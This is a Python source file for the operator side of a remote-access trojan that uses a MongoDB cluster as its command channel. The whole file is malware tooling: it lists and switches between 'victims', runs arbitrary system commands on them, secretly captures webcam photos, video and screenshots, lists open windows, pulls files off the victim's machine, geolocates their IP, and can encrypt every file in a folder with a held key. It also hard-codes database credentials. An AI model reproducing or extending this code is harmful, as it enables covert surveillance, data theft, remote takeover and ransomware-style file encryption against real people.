import pymongo
import json
from PIL import Image as im
import numpy as np
import requests
from colorama import Fore,init,Style
import os
import socket
import gridfs
import datetime
import time
from threading import Thread
from datetime import date

MY_FAV_ROOT=f'{os.getcwd()}'
MY_FAV_FOLDER='ShellUtsav'

init(autoreset=True)


con = "mongodb+srv://utsav:utsav@cluster0.rqeuq69.mongodb.net/?retryWrites=true&w=majority"

client = pymongo.MongoClient(con,tls=True,tlsAllowInvalidCertificates=True)

db=client['shell']

fs=gridfs.GridFS(db)

MY_COMMANDS=['targetlist','commandsdict','shifttarget','webcam','vwebcam','exit','e','quit','q','commands','dir','cd','cd..','deletefile','createfile','snap','getfile','showimg','mkdir','rmdir','activewindows','getfilesize','disks','encrypt','decrypt','targetinfo','getalltypefiles','refreshserver','system']
IGNORE_COMMANDS_ON_NETWORK=['targetlist','shifttarget','exit','e','quit','q','commands','targetinfo','refreshserver','commandsdict']

COMMANDS_DICT=[
    'targetlist : --> shows all victims',
    "shifttarget : --> takes an arg of victim's computer hostname to shift the target to that machine",
    "webcam : --> takes victim's selfie automatically",
    "vwebcam : --> takes an arg of time in second to capture a video of that time limit",
    "exit,e,quit,q : --> to exit from terminal",
    "commands : --> list of all existing commands",
    "dir : --> show contents of a directory",
    "cd : --> 1 step forward navigate for path",
    "cd.. : --> 1 step backward navigate for path",
    "deletefile : --> delete an existing file. Takes the filename as arg.",
    "createfile : --> create a  file. Takes the filename as arg.",
    "snap : --> taking a snapshot of victim's current screen",
    "getfile : --> get an existing small file. Takes the filename as arg.",
    "getalltypefiles : --> get big files. Takes the filename as arg.",
    "showimg : --> show an image. Takes the image-name as arg.",
    "mkdir : --> makes a directory. Takes the folder-name as arg.",
    "rmdir : --> delete a full or empty entire folder. Takes the folder-name as arg.",
    "activewindows : --> in victim's machine which tabs are open in background.",
    "getfilesize : --> get the size of any file. Takes the filename as arg.",
    "disks : --> present disk-drives of victim's machine.",
    "encrypt : --> encrypt any file. If you pass * as arg means all files of that dir will be encrypted or you can pass a particular filename in arg.",
    "decrypt : --> decrypt any file. If you pass * as arg means all files of that dir will be decrypted or you can pass a particular filename in arg.",
    "targetinfo : --> details about victim machine.",
    "refreshserver : --> helps to restart if any mistake.",
    "system : --> can pass any cmd command as an arg."
]

CWD=r""
LAST_PATH=""
TARGET=""
IP=""
PUBLIC_IP=""
PREV_COMMAND=""
SHELL_RESULT=False
FILENAME=""
LAST_SEEN=""
STATUS=""
STOP=False

hostname = socket.gethostname()
IPAddr = socket.gethostbyname(hostname)

def has_active_internet():
    if IPAddr=="127.0.0.1":
        return False
    else:
        return True

def command_dict():
    print(Fore.CYAN+">>> ")
    for c,i in enumerate(COMMANDS_DICT,start=1):
        print(Fore.LIGHTRED_EX+str(c)+" "+Fore.CYAN+i)

def targetInfo():
    global PUBLIC_IP
    if PUBLIC_IP:
        response = requests.get(f'http://ip-api.com/json/{PUBLIC_IP}').json()
        try:
            city=response.get("city")
            region=response.get("regionName")
            country=response.get("country")
            public_ip=PUBLIC_IP
            lat=response.get("lat")
            lon=response.get("lon")
            isp=response.get('isp')
            location_data =[
            f"Public_IP --> {public_ip}",
            f"city --> {city}",
            f"region --> {region}" ,
            f"country --> {country}",
            f"Latitude --> {lat}",
            f"Longitude --> {lon}",
            f"Internet Service Provider --> {isp}"
            ]
            print(Fore.CYAN+">>> ")
            for i in location_data:
                print(i)
            print()
        except:
            print(Fore.CYAN+">>> ")
            print("Something went wrong!!!")
    else:
        print(Fore.CYAN+">>> ")
        print("No Public IP Found!!!")

def target_strings(a,index):
    strr=""
    for i in range(index,len(a)):
        if i==len(a)-1:
            strr+=a[i]
        else:
            strr+=a[i]+" "
    return strr

def check_online():
    global STOP,TARGET,STATUS
    while True:
        col=db['systemInfo']
        res=col.find()
        times=datetime.datetime.now()
        minute=times.minute
        hour=times.hour
        if STOP:
            break
        today=date.today()
        year=today.year
        month=today.month
        day=today.day
        strr=f'{year}-{month}-{day}'
        for i in res:
            last_seen=i['last_seen']
            arry=last_seen.split(" ")
            new_arry=arry[1].split(":")
            if ((int(minute) == int(new_arry[1])) and strr==arry[0] and int(new_arry[0])==int(hour)):
                filters={
                "hostname":i['hostname']
                }
                value={
                    "$set":{
                    "status":"Online"
                    }
                }
                try:
                    col.update_one(filters,value)
                except Exception as e:
                    print(e)
            else:
                filters={
                "hostname":i['hostname']
                }
                value={
                    "$set":{
                    "status":"Offline"
                    }
                }
                try:
                    col.update_one(filters,value)
                except Exception as e:
                    print()
            if(i['hostname']==TARGET):
                STATUS=i['status']
            time.sleep(2)
            

def getAllTargets():
    global TARGET,LAST_SEEN
    col=db['systemInfo']
    res=col.find()
    print()
    print(Fore.BLUE+Style.BRIGHT+"\tTARGETS: ")
    print()
    print(Fore.LIGHTBLUE_EX+Style.BRIGHT+"\t| Hostname |\t\tIP\t\t | Last_Seen\t\t | Status")
    print(Fore.BLUE+Style.BRIGHT+"\t--------------------------------------------------------------------------------------")
    for i in res:
        if i['hostname']==TARGET:
            print(Fore.MAGENTA+Style.BRIGHT+f"\t| {i['hostname']} |\t{i['ip']}\t | {i['last_seen']}\t | {i['status']}   <-- Current")
            print(Fore.BLUE+Style.BRIGHT+"\t--------------------------------------------------------------------------------------")
        else:
            print(Fore.GREEN+Style.BRIGHT+f"\t| {i['hostname']} |\t{i['ip']}\t | {i['last_seen']}\t | {i['status']}")
            print(Fore.BLUE+Style.BRIGHT+"\t--------------------------------------------------------------------------------------") 
    print()

def getTargetMachine(target=""):
    global TARGET,IP,PUBLIC_IP,CWD,PREV_COMMAND,LAST_SEEN,STATUS
    col=db['systemInfo']
    if target=="":
        x=col.find_one()
        if x:
            TARGET=x['hostname']
            IP=x['ip']
            PUBLIC_IP=x['public_ip']
            LAST_SEEN=x['last_seen']
            STATUS=x['status']
            CWD=""
            PREV_COMMAND=""
            return x['hostname'],x['ip']
        else:
            TARGET='None'
            IP='None'
    else:
        filters={
            "hostname":target
        }
        x=col.find_one(filter=filters)
        if x:
            TARGET=x['hostname']
            IP=x['ip']
            PUBLIC_IP=x['public_ip']
            CWD=""
            PREV_COMMAND=""
            return x['hostname'],x['ip']
        else:
            TARGET='None'
            IP='None'

def systemCommandsHandeler():
    global PREV_COMMAND,CWD,TARGET
    a=PREV_COMMAND.split(" ")
    count=0
    new_cmd=""
    col=db['myshell']
    for i in a:
        count+=1
        if i=='system':
            continue
        else:
            if count==len(a):
                new_cmd+=i+" "+"|"+" "+"clip"
            else:
                new_cmd+=i+" "
    data={
        "action":new_cmd,
        "target":TARGET,
        "current_path":CWD,
        "target_string":"",
        "target_element":"",
        "new_filename":"",
        "is_systemCommand":1
        }
    try:
        if not (col.find_one()):
            col.insert_one(data)
            result_for_systemCommand()
        else:
            filters={
                "target":TARGET
                }
            col.delete_one(filters)
            col.insert_one(data)
            result_for_systemCommand()
    except Exception as e:
                print(e)


def result_for_systemCommand():
    col=db['shellresult']
    filters={
            "hostname":TARGET
        }
    while True:
        try:
            listen=col.find_one(filter=filters)
            if listen['result'] and listen['hostname']:
                print(Fore.CYAN+">>> ")
                print(listen['result'])
                break
            elif listen['result']=="" and listen['hostname']:
                break
        except:
            pass



def operation():
    global CWD
    leng=len(CWD)-1
    arr=[]
    while leng>=1:
       arr.append(leng)
       if CWD[leng]=='\\':
            break
       leng=leng-1 
    strr=""
    arr=sorted(arr)    
    for i in arr:
        strr=strr+CWD[i]
    CWD=CWD.replace(strr,"")
    if CWD in ['C:','D:','E:','F:','G:','H:']:
        CWD=CWD+'\\'

def clearCollection():
    global TARGET
    col=db['myshell']
    col2=db['shellresult']
    filters={
        "target":TARGET
    }
    another_filer={
        "hostname":TARGET
    }
    try:
        col.delete_many(filters)
        col2.delete_one(another_filer)
        list_coll=db.list_collection_names()
        for i in list_coll:
            if i=='fs.files':
                col=db['fs.files']
                col.drop()
            if i=='fs.chunks':
                coll=db['fs.chunks']
                coll.drop()
    except Exception as e:
        print(e)


def binaryContent():
    global MY_FAV_ROOT,MY_FAV_FOLDER,FILENAME
    if not (os.path.exists(MY_FAV_ROOT+f"\{MY_FAV_FOLDER}")):
        os.mkdir(MY_FAV_ROOT+f"\{MY_FAV_FOLDER}")
    while True:
        data=db.fs.files.find_one({'filename':FILENAME})
        if data:
            try:
                my_id=data['_id']
                output=fs.get(my_id).read()
                download_location=MY_FAV_ROOT+f"\{MY_FAV_FOLDER}\\"+FILENAME
                out=open(download_location,'wb')
                out.write(output)
                out.close()
                list_coll=db.list_collection_names()
                for i in list_coll:
                    if i=='fs.files':
                        col=db['fs.files']
                        col.drop()
                    if i=='fs.chunks':
                        coll=db['fs.chunks']
                        coll.drop()
                break
            except:
                pass
    

def imageShow():
    col=db['shellresult']
    filters={
            "hostname":TARGET
        }
    while True:
        res=col.find_one(filters)
        if res:
            arry = np.array(res['result'])
            data = im.fromarray(arry.astype('uint8'))
            data.show()
            clearCollection()
            break


def is_directory_change_command():
    global PREV_COMMAND
    global CWD
    global LAST_PATH,STATUS,IGNORE_COMMANDS_ON_NETWORK
    a= (PREV_COMMAND.split(" "))

    if STATUS=='Offline' and (a[0] not in IGNORE_COMMANDS_ON_NETWORK):
        return
    else:
        if a[0]=='cd':
            if a[1] in ['C:\\','D:\\','E:\\','F:\\','G:\\','H:\\']:
                CWD=a[1]
                PREV_COMMAND=a[1]
            if (a[1])[0]=='\\':
                print(Fore.CYAN+">>> ")
                print("invalid navigate")
            else:
                if CWD and CWD[len(CWD)-1]!='\\':
                    a[1]='\\'+target_strings(a=a,index=1)
                else:
                    a[1]=target_strings(a=a,index=1)             
                CWD=CWD+f'{a[1]}'
                LAST_PATH=f'{a[1]}'
        elif a[0]=='cd..':
                operation()


def ActionUploader():
    global PREV_COMMAND,CWD,MY_COMMANDS,FILENAME,STATUS,IGNORE_COMMANDS_ON_NETWORK
    a= (PREV_COMMAND.split(" "))
    col=db['myshell']
    clearCollection()

    if STATUS=='Offline' and (a[0] not in IGNORE_COMMANDS_ON_NETWORK):
        print(Fore.CYAN+">>> ")
        print("Target is in Offline Mode!!!")
        print()
        return

    else:
        if ((a[0] not in (MY_COMMANDS))):
            print(Fore.CYAN+">>> ")
            print("invalid command")
            print()
            return
    

        if a[0]=='commands' and len(a)==1:
            print(Fore.CYAN+">>> ")
            for i in MY_COMMANDS:
                print(i)
            print()

        elif a[0]=='commandsdict':
            command_dict()

        elif a[0]=='encrypt':
            with open('secret.key','rb') as seckey:
                key=seckey.read()
            target_element=target_strings(a,1)
            data={
                    "action":a[0],
                    "target_element":target_element,
                    "target":TARGET,
                    "key":str(key,'utf-8'),
                    "current_path":CWD,
                    "is_systemCommand":0
                    }
            if not (col.find_one()):
                    col.insert_one(data)
            else:
                    filters={
                        "target":TARGET
                    }
                    col.delete_one(filters)
                    col.insert_one(data)

        elif a[0]=='decrypt':
            with open('secret.key','rb') as seckey:
                key=seckey.read()
            target_element=target_strings(a,1)
            data={
                    "action":a[0],
                    "target_element":target_element,
                    "target":TARGET,
                    "key":str(key,'utf-8'),
                    "current_path":CWD,
                    "is_systemCommand":0
                    }
            if not (col.find_one()):
                    col.insert_one(data)
            else:
                    filters={
                        "target":TARGET
                    }
                    col.delete_one(filters)
                    col.insert_one(data)

        elif a[0]=='webcam' and len(a)==1:
                data={
                    "action":a[0],
                    "target":TARGET,
                    "current_path":CWD,
                    "is_systemCommand":0
                    }
                if not (col.find_one()):
                    col.insert_one(data)
                else:
                    filters={
                        "target":TARGET
                    }
                    col.delete_one(filters)
                    col.insert_one(data)

        elif a[0]=='vwebcam' and len(a)==2:
            data={
                    "action":a[0],
                    "target":TARGET,
                    "current_path":CWD,
                    "timeout":a[1],
                    "is_systemCommand":0
                    }
            if not (col.find_one()):
                    col.insert_one(data)
            else:
                    filters={
                        "target":TARGET
                    }
                    col.delete_one(filters)
                    col.insert_one(data)

        elif a[0]=='showimg':
            target_element=target_strings(a,1)
            data={
                    "action":a[0],
                    "target":TARGET,
                    "current_path":CWD,
                    "target_element":target_element,
                    "new_filename":"",
                    "target_string":"",
                    "is_systemCommand":0
                    }
            try:
                    if not (col.find_one()):
                        col.insert_one(data)
                        imageShow()
                    else:
                        filters={
                            "target":TARGET
                            }
                        col.delete_one(filters)
                        col.insert_one(data)
                        imageShow()
            except Exception as e:
                    print(e)

        elif a[0]=='snap' and len(a)==1:
                data={
                    "action":a[0],
                    "target":TARGET,
                    "current_path":CWD,
                    "target_element":"",
                    "new_filename":"",
                    "target_string":"",
                    "is_systemCommand":0
                    }
                try:
                    if not (col.find_one()):
                        col.insert_one(data)
                        imageShow()
                    else:
                        filters={
                            "target":TARGET
                            }
                        col.delete_one(filters)
                        col.insert_one(data)
                        imageShow()
                except Exception as e:
                        print(e)

        elif a[0]=='getfilesize':
            target_element=target_strings(a,1)
            data={
                    "action":a[0],
                    "target":TARGET,
                    "current_path":CWD,
                    "target_element":target_element,
                    "new_filename":"",
                    "target_string":"",
                    "is_systemCommand":0
                    }
            try:
                    if not (col.find_one()):
                        col.insert_one(data)
                    
                        try:
                            col=db['shellresult']
                            filters={
                                "hostname":TARGET
                            }
                            while True:
                                res=col.find_one(filters)
                                if res:
                                    print(Fore.CYAN+">>> ")
                                    print(Fore.CYAN+f"{res['result']} MB")
                                    break
                        except Exception as e:
                            print(e)
                    else:
                        filters={
                            "target":TARGET
                            }
                        col.delete_one(filters)
                        col.insert_one(data)
                        try:
                            col=db['shellresult']
                            filters={
                                "hostname":TARGET
                            }
                            while True:
                                res=col.find_one(filters)
                                if res:
                                    print(Fore.CYAN+">>> ")
                                    print(Fore.CYAN+f"{res['result']} MB")
                                    break
                        except Exception as e:
                            print(e)
            except Exception as e:
                    print(e)

        elif a[0]=='activewindows' and len(a)==1:
                data={
                    "action":a[0],
                    "target":TARGET,
                    "current_path":CWD,
                    "target_element":"",
                    "new_filename":"",
                    "target_string":"",
                    "is_systemCommand":0
                    }
                try:
                    if not (col.find_one()):
                        col.insert_one(data)
                        try:
                            col=db['shellresult']
                            filters={
                                "hostname":TARGET
                            }
                            while True:
                                res=col.find_one(filters)
                                if res:
                                    print(Fore.CYAN+">>> ")
                                    for i in res['result']:
                                        print(i)
                                    break
                        except Exception as e:
                            print(e)
                    else:
                        filters={
                            "target":TARGET
                            }
                        col.delete_one(filters)
                        col.insert_one(data)
                        try:
                            col=db['shellresult']
                            filters={
                                "hostname":TARGET
                            }
                            while True:
                                res=col.find_one(filters)
                                if res:
                                    print(Fore.CYAN+">>> ")
                                    for i in res['result']:
                                        print(i)
                                    break
                        except Exception as e:
                            print(e)
                except Exception as e:
                        print(e)
        
        elif a[0]=='targetinfo' and len(a)==1:
            targetInfo()
        elif a[0]=='refreshserver' and len(a)==1:
            clearCollection()
            CWD=""
            PREV_COMMAND=""
    
        elif a[0]=='system':
            systemCommandsHandeler()
        elif a[0]=='targetlist' and len(a)==1:
            getAllTargets()
        elif a[0]=='shifttarget' and len(a)==2:
            getTargetMachine(target=a[1])

        elif a[0]=='getalltypefiles':
            target_element=target_strings(a,1)
            FILENAME=target_strings(a,1)
            data={
                    "action":a[0],
                    "target":TARGET,
                    "current_path":CWD,
                    "target_element":target_element,
                    "new_filename":"",
                    "target_string":"",
                    "is_systemCommand":0
                    }
            try:
                if not (col.find_one()):
                    col.insert_one(data)
                    binaryContent()
                else:
                    filters={
                        "target":TARGET
                        }
                    col.delete_one(filters)
                    col.insert_one(data)
                    binaryContent()
            except Exception as e:
                    print(e)
        
    
        else:
            if a[0] not in ['cd','cd..','exit','e','quit','q','commands']:
                action=a[0]
                current_path=CWD
                target=TARGET
                if len(a)>=2:
                    target_element=target_strings(a,1)
                    data={
                    "action":action,
                    "target":target,
                    "current_path":current_path,
                    "target_element":target_element,
                    "new_filename":"",
                    "target_string":"",
                    "is_systemCommand":0
                    }
                elif len(a)>=3:
                    if a[0]=='updatefile':
                        target_element=a[1]
                        target_string=target_strings(a,2)
                        print(target_string,target_element)
                        data={
                            "action":action,
                            "target":target,
                            "current_path":current_path,
                            "target_element":target_element,
                            "target_string":target_string,
                            "new_filename":"",
                            "is_systemCommand":0
                            }
                    elif a[0]=='renamefile':
                        target_element=a[1]
                        new_filename=a[2]
                        data={
                            "action":action,
                            "target":target,
                            "current_path":current_path,
                            "target_element":target_element,
                            "new_filename":new_filename,
                            "target_string":"",
                            "is_systemCommand":0
                            }
                else:
                    data={
                    "action":action,
                    "target":target,
                    "current_path":current_path,
                    "target_string":"",
                    "target_element":"",
                    "new_filename":"",
                    "is_systemCommand":0
                    }
                try:
                    if not (col.find_one()):
                        col.insert_one(data)
                        result_for_shell(a[0])
                    else:
                        filters={
                            "target":TARGET
                            }
                        col.delete_one(filters)
                        col.insert_one(data)
                        result_for_shell(a[0])
                except Exception as e:
                    print(e)


def display(res):
    print(Fore.CYAN+">>> ")
    if(type(json.loads(res['result']))==list):
        for i in (json.loads(res['result'])):
            print(i)
    else:
        print(json.loads(res['result']))
    print()
    clearCollection()


def result_for_shell(command):
    if command not in ['cd','commands','cd..','exit','e','quit','q','deletefile','updatefile','mkdir','rmdir','createfile','renamefile','encrypt','decrypt']:
        col=db['shellresult']
        filters={
            "hostname":TARGET
        }
        while True:
                res=col.find_one(filters)
                if res:
                    display(res)
                    break



def shell():
    global CWD
    global PREV_COMMAND
    global TARGET,IP,STOP,STATUS
    getTargetMachine()
    while True:
        
        struct0=(Fore.LIGHTYELLOW_EX+f"~\{CWD}")
        struct00=(Fore.MAGENTA+Style.BRIGHT+f"{IP}")
        struct1=(Fore.CYAN+Style.BRIGHT+f"target@{TARGET} {struct00} {struct0}\n")
        struct2=(Fore.MAGENTA+Style.BRIGHT+"$ ")
        shell_struct=struct1+struct2
        command=str(input(shell_struct))
        
        try:
                PREV_COMMAND=(command) 
                if command in ['exit','e','quit','q']:
                    clearCollection()
                    STOP=True
                    break
                is_directory_change_command()
                ActionUploader()

        except Exception as e:
                print(e)
       

def thread():
    internet=has_active_internet()
    if internet:
        Thread(target=shell).start()
        Thread(target=check_online).start()
    else:
        print(">>> ")
        print("You are Offline!!!...")


thread()